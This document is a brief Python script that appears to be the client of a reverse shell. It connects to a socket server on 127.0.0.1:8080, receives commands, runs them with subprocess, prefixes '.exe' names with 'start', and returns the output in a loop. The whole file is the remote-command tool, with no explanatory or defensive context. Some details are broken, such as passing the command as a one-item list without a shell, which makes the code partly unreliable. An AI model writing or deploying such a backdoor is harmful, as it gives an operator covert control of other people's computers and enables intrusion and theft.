import time
import socket
import sys
import os
import subprocess

s = socket.socket()

host = "127.0.0.1"

port = 8080

s.connect((host, port))

print("Connected to Server.")
terminated = 'n'
while(terminated =='n'):
    command = s.recv(1024)
    command = command.decode()

    if command.endswith(".exe") and not command.startswith("start"):
        command = "start " + command[:0] + command[0:]
    print("Command is: ", command)
    try:
        commandResults = subprocess.run([str(command)], capture_output=True, text=True).stdout #   stdout=subprocess.PIPE, stderror=subprocess.PIPE).stdout.decode('utf-8')
    except:
        commandResults = "Error"

    s.send(commandResults.encode())
    terminated = s.recv(1024)
    terminated = terminated.decode()
print("Connection Terminated")